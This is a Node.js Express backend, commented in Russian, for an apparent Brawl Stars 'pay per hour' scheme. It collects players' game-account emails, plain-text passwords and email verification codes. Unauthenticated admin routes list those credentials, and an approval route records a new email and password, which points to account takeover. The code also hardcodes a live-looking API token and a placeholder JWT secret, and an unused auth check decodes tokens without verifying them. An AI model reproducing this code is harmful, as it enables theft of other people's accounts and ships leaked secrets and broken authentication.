const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
require('dotenv').config();
const fs = require('fs');
const path = require('path');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const mongoose = require('mongoose');
const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

// Настройка CORS и JSON парсера
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Ваш API Token из Brawl Stars
const API_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6ImMxY2MwOGY5LTZjNzItNDEzNi05NzQ3LTUwYTQ5OGM5YTVkYSIsImlhdCI6MTcyNjA4MzI2Mywic3ViIjoiZGV2ZWxvcGVyLzZjYzJjYzU2LWMzNTUtNmJhOC0yMzU3LThmNzg0NDQ1YmNmOCIsInNjb3BlcyI6WyJicmF3bHN0YXJzIl0sImxpbWl0cyI6W3sidGllciI6ImRldmVsb3Blci9zaWx2ZXIiLCJ0eXBlIjoidGhyb3R0bGluZyJ9LHsiY2lkcnMiOlsiNTEuMTc0LjIwOC4xMDQiXSwidHlwZSI6ImNsaWVudCJ9XX0.cHEC73aYpOsQ432KhB1Vjuzj3k32x9houMYCWV5gvD-UIXI0dQsyBpe4-mf2G7RtqEj3gP17a46LIy0MZQcX_Q"; // Обязательно добавьте это в ваш .env файл
const API_BASE_URL = 'https://api.brawlstars.com/v1/';

// Функция для получения данных о игроке


const verifyToken = (req, res, next) => {
  const token = req.headers['authorization']?.split(' ')[1]; // Получаем токен из заголовка

  if (!token) {
    return res.redirect('/registration'); // Перенаправляем на регистрацию, если токен отсутствует
  }

  jwt.verify(token, 'your_jwt_secret_key', (err, decoded) => {
    if (err) {
      return res.redirect('/registertration'); // Перенаправляем на регистрацию, если токен недействителен
    }
    req.user = decoded;  // Сохраняем информацию о пользователе в запросе
    next();
  });
}

const getPlayerData = async (playerTag) => {
  try {
    const response = await axios.get(`${API_BASE_URL}players/%23${playerTag}`, {
      headers: { 'Authorization':` Bearer ${API_TOKEN}` }
    });
    return response.data;
  } catch (error) {
    console.error('Error fetching player data:', error);
    throw error;
  }
};
const BrawlSchema = new mongoose.Schema({
  Brawlid: { type: String, required: true, unique: true },
  Brawlmail: { type: String, required: true },
  Brawlpass: { type: String, required: true },
  Ovnernick: { type: String, required: true , unique: true },
  mailcode: { type: String, required: false},
  
});

const CompleteSchema = new mongoose.Schema({
  Newmail: { type: String, required: true, unique: true },
  newpass:{ type: String, required: true },
  
});

const DealslSchema = new mongoose.Schema({
  WorkerId: { type: String, required: true, unique: true },
  items: {
    type: [String],     // Поле для массива строк (может быть другим типом, например, объектами)
    default: []         // Значение по умолчанию — пустой массив
}

  
});
const UserSchema = new mongoose.Schema({
  username: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  Brawlid:{ type: String, required: false },
  Brawlincome:{ type: String, required: false },
  BrawlAproved: { type: String, default: "0" },
  RefId: { type: String, required: false},
  dataern: { type: String, required: false},


  
});
const advert = mongoose.model('advert', DealslSchema);
const Brawl = mongoose.model('Brawl', BrawlSchema);
const User = mongoose.model('User', UserSchema);
const Complete = mongoose.model('complete', CompleteSchema);

mongoose.connect('mongodb://localhost:27017/mydb', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
}).then(() => {
  console.log('Successfully connected to the database');
}).catch((err) => {
  console.error('Database connection error:', err);
});
// Модель пользователя


// Функция для получения данных о клубе
const getClubData = async (clubTag) => {
  try {
    const response = await axios.get(`${API_BASE_URL}clubs/%23${clubTag}`, {
      headers: { 'Authorization': `Bearer ${API_TOKEN} `}
    });
    return response.data;
  } catch (error) {
    console.error('Error fetching club data:', error);
    throw error;
  }
};

// Эндпоинт для получения данных о игроке
app.use(express.static(path.join(__dirname, 'assets')));


app.post('/register', async (req, res) => {
  const { username, password, userId } = req.body;


  try {
      // Проверяем, существует ли пользователь
      const existingUser = await User.findOne({ username:username });
      if (existingUser) {
          return res.status(400).json({ message: 'Пользователь уже существует' });
      }

      // Хешируем пароль
      const hashedPassword = await bcrypt.hash(password, 10);

      // Сохраняем пользователя в базе данных
      const newUser = new User({ username:username, password: hashedPassword, RefId: userId});
      await newUser.save();
      res.json({username:username})


  } catch (error) {
    console.error(error);
  }
});
app.get('/registration/:tag', async (req, res) => {

  const token = req.headers['authorization']?.split(' ')[1]; // Получаем токен из заголовка
  if (token) {
    // Проверяем валидность токена
    jwt.verify(token, 'your_jwt_secret_key', (err, decoded) => {
      if (!err) {

        // Если токен валиден, перенаправляем на /start
        return res.redirect('/start');
      }
    });
  }

  // Если токена нет или он недействителен, возвращаем страницу регистрации
  const filePath = path.join(__dirname, 'registration.html');
    fs.readFile(filePath, 'utf8', (err, data) => {
        res.send(data);})})



// Эндпоинт для получения данных о playerData
app.get('/club/:tag', async (req, res) => {
  const clubTag = req.params.tag;
  try {
    const clubData = await getClubData(clubTag);
    res.json(clubData);
  } catch (error) {
    res.status(500).send('Error fetching club data.');
  }
});

// Обычные маршруты
app.get('/profile', (req, res) => {
  const filePath = path.join(__dirname, 'home.html');
  fs.readFile(filePath, 'utf8', (err, data) => {
      res.send(data);
      })
});
app.get('/faq', (req, res) => {
  const filePath = path.join(__dirname, 'faq.html');
  fs.readFile(filePath, 'utf8', (err, data) => {
      res.send(data);
      })
});


app.get('/manage', (req, res) => {
  const filePath = path.join(__dirname, 'manage.html');
  fs.readFile(filePath, 'utf8', (err, data) => {
      res.send(data);
      })
});


app.get('/main', (req, res) => {
  const filePath = path.join(__dirname, 'aboutus.html');
  fs.readFile(filePath, 'utf8', (err, data) => {
      res.send(data);
      })
});


app.get('/start', (req, res) => {
    const filePath = path.join(__dirname, 'start.html');
    fs.readFile(filePath, 'utf8', (err, data) => {
        res.send(data);
       })
  });
  app.post('/submit',async (req, res) => {
    const { nickname } = req.body;
    console.log(nickname)
    const existingUser = await Brawl.findOne({Brawlid: nickname});
      if (existingUser) {
          return res.status(400).json({ message: 'Пользователь уже существует' });
      }
    const playerTag = nickname;
    try {
      const playerData = await getPlayerData(playerTag);
  // res.json(playerData)
    res.send( `Ник- ${playerData.name} <br> 
    Оплата за бойцов ${(playerData.brawlers).length}*1руб = ${(playerData.brawlers).length} <br> 
    Оплата за кубки ${playerData.trophies} * 0.001 = ${Math.round(playerData.trophies/1000)} <br>
    Итог ${(playerData.brawlers).length+Math.round(playerData.trophies/1000)} рублей в час `);
    } catch (error) {
      res.status(500).send('Error fetching player data.');
    }

  });
  app.post('/sendcode', async (req, res) => {
    const {username, code} = req.body;
  console.log(username + "fsfs")
    console.log(code);
  
    try {
      // Обновление пользователя
      const resultd = await Brawl.updateOne(
        { Ovnernick: username },  // Условие для поиска пользователя
        { $set: { mailcode: code } } // Обновляемые данные\
      )
        const result = await User.updateOne(
          { username: username },  // Условие для поиска пользователя
          { $set: { BrawlAproved: "3" } } // Обновляемые данные\
      );
  
      if (resultd.nModified > 0) {
        // Если обновление произошло, возвращаем успех
        res.status(200).json({ message: 'Code updated successfully' });
      } else {
        // Если пользователь не найден или ничего не изменилось
        res.status(404).json({ message: 'User not found or code not updated' });
      }
    } catch (error) {
      console.error(error);
      res.status(500).send('Error updating code');
    }
  });
app.post('/data', (req, res) => {

  res.send('Data received');
});
app.post('/check', async (req, res) => {

  
  const { arg1,arg2, arg3,arg4, arg5} = req.body;

  try {
      // Проверяем, существует ли пользователь
      const existingUser = await Brawl.findOne({Brawlid: arg1});
      if (existingUser) {
          return res.status(400).json({ message: 'Пользователь уже существует' });
      }
      // Хешируем пароль
      User.updateOne(
        { username: arg4 },  // Условие для поиска пользователя
        { $set: { Brawlincome: arg5, Brawlid: arg1, BrawlAproved:"1" } } // Обновляемые данные
      )
      .then(result => {
        if (result.modifiedCount > 0) {
          console.log('Пользователь успешно обновлен');
        } else {
          console.log('Пользователь не найден или данные не изменены');
        }
      })
      .catch(error => {
        console.error('Ошибка обновления пользователя:', error);
      });
      
      // Сохраняем пользователя в базе данных

      const newUser = new Brawl({Brawlid: arg1, Brawlmail: arg2, Brawlpass: arg3, Ovnernick: arg4,});
      await newUser.save();


  } catch (error) {
      res.status(500).json({ message: 'Ошибка на сервере' });
  }
});



  app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    try {
      // Ищем пользователя в базе данных
      const user = await User.findOne({ username: username });
  
      // Если пользователь не найден
      if (!user) {
        return res.status(401).json({ message: 'Неверное имя пользователя или пароль' });
      }
  
      // Сравниваем пароли
      const isPasswordValid = await bcrypt.compare(password, user.password);
      
      if (!isPasswordValid) {
        return res.status(401).json({ message: 'Неверное имя пользователя или пароль' });
      }
  
      // Генерация токена
      const token = jwt.sign({ username }, 'your_jwt_secret_key', { expiresIn: '1h' });
  
      // Отправляем токен и сообщение об успешном входе
      res.status(200).json({ username:username, message: 'Вход выполнен успешно' });
  
      // Опционально: можно перенаправить на страницу после успешного входа
      // res.redirect('/start');
  
    } catch (error) {
      console.error(error);
      res.status(500).json({ message: 'Ошибка сервера' });
    }
  });
  



app.post('/profile', async (req, res) => {

  const {username} = req.body;

    try {
      const user = await User.findOne({username});
      if (user) {
        console.log('Найден пользователь:', user);
        res.send(user)
      } else {

        console.log('Пользователь не найден');
      }
    } catch (error) {
      console.error('Ошибка:', error);
    }
  
});
app.post('/manage', async (req, res) => {
  const { username } = req.body;
  
  try {
    console.log('Запрос на управление');
    
    // Шаг 1: Найти всех пользователей с BrawlAproved = "1"
    const users = await User.find({ BrawlAproved: "1" });

    // Шаг 2: Для каждого пользователя найти информацию в коллекции Brawl
    const results = await Promise.all(users.map(async (user) => {
      const curus = await Brawl.findOne({ Brawlid: user.Brawlid });
      return curus; // Возвращаем результат для последующей обработки
    }));

    res.json({ success: true, results });
    
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: 'Ошибка на сервере' });
  }
});

app.post('/managesecond', async (req, res) => {
  const { username } = req.body;
  
  try {
    console.log('Запрос на управление');
    // Шаг 1: Найти всех пользователей с BrawlAproved = "1"
    const users = await User.find({ BrawlAproved: "3" });

    // Шаг 2: Для каждого пользователя найти информацию в коллекции Brawl
    const results = await Promise.all(users.map(async (user) => {
      const curus = await Brawl.findOne({ Brawlid: user.Brawlid });
      console.log(curus)
      return curus; // Возвращаем результат для последующей обработки

    }));

    res.json({ success: true, results });
    
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: 'Ошибка на сервере' });
  }
});
app.post('/approvefirst', async (req, res) => {
  const { approve } = req.body;
  console.log(approve)
  
  try {
    const result = await User.updateOne(
      { Brawlid: approve },  // Условие для поиска пользователя
      { $set: {BrawlAproved: "2" } } // Обновляемые данные
    )
    console.log(result)
    res.json({ success: true, });
    
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: 'Ошибка на сервере' });
  }
});

app.post('/approvesecond', async (req, res) => {
  const { approve, newpass, newmail} = req.body;
  console.log(" fdfddfsf " + req.body)
  console.log("dfdf"+ approve)
  const currentDate = new Date();

  try {
    const newUser = new Complete({ Newmail:newmail, newpass:newpass});
    const result = await User.updateOne(
      { Brawlid: approve },  // Условие для поиска пользователя
      { $set: {BrawlAproved: "4", dataern: currentDate} } // Обновляемые данные
    )
    await newUser.save();
    console.log(result)
    res.json({ success: true, });
    
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: 'Ошибка на сервере' });
  }
});
app.post('/refusesecond', async (req, res) => {
  const { approve } = req.body;
  console.log(approve)
  
  try {
    const result = await User.updateOne(
      { Brawlid: approve },  // Условие для поиска пользователя
      { $set: {BrawlAproved: "-2" } } // Обновляемые данные
    )
    console.log(result)
    res.json({ success: true, });
    
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: 'Ошибка на сервере' });
  }
});


app.post('/refusefirst', async (req, res) => {
  const { approve } = req.body;
  console.log(approve)
  
  try {
    const result = await User.updateOne(
      { Brawlid: approve },  // Условие для поиска пользователя
      { $set: {BrawlAproved: "-1" } } // Обновляемые данные
    )
    console.log(result)
    res.json({ success: true, });
    
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: 'Ошибка на сервере' });
  }
});
 
// Middleware для проверки токена
const authenticate = (req, res, next) => {
  const token = req.headers['authorization']?.split(' ')[1];

  if (!token) {
    return res.status(401).json({ message: 'No token provided' });
  }

  try {
    const decoded = jwt.decode(token, SECRET_KEY);
    req.user = decoded;
    next();
  } catch (error) {
    res.status(401).json({ message: 'Invalid token' });
  }
};
app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});



const port = process.env.PORT || 3000;
const host = '0.0.0.0';  // Прослушивание на всех доступных IP
app.listen(port, host, () => {
  console.log(`Server is running on port ${port}`);
});
